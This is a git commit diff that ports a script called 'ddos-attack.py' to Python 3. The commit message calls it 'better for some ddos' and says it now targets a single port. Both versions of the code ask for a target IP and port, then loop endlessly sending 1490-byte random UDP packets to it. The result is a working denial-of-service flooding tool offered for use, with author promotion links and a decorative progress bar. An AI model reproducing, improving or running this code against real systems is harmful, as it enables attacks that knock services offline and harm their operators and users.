a2f8f2ac3557fda688f1e0c312112f300de69dfa
Alexandro <52381045+AlexandroLuis@users.noreply.github.com>
2022-11-17 14:41:02 -0300

    Update ddos-attack.py
    Hello there, i adapted your src to python3 and it only sent to a specific port (better for some ddos i think).

--- ddos-attack.py
+++ ddos-attack.py
@@ -1,9 +1,8 @@
-import sys
 import os
 import time
 import socket
 import random
-#Code Time
+
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -12,40 +11,28 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+#os.system("figlet DDos Attack")
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
+print(f"\nAuthor   : HA-MRX")
+print("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
+print("github   : https://github.com/Ha3MrX")
+print(f"Facebook : https://www.facebook.com/muhamad.jabar222\n")
+
+ip = input("IP Target: ")
+port = input("Target Port: ")
+
+x = '*'
+
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+     os.system('cls||clear')
+     #os.system("figlet Attack Starting")
+     for i in range(0, 5):
+          yT = i * 25
+          print(f"[{x * yT}] {yT}% ")
+          time.sleep(0.5)
+     sock.sendto(bytes, (ip,int(port)))
+     print (f"Sent a packet to {ip} throught port: {port}")
 
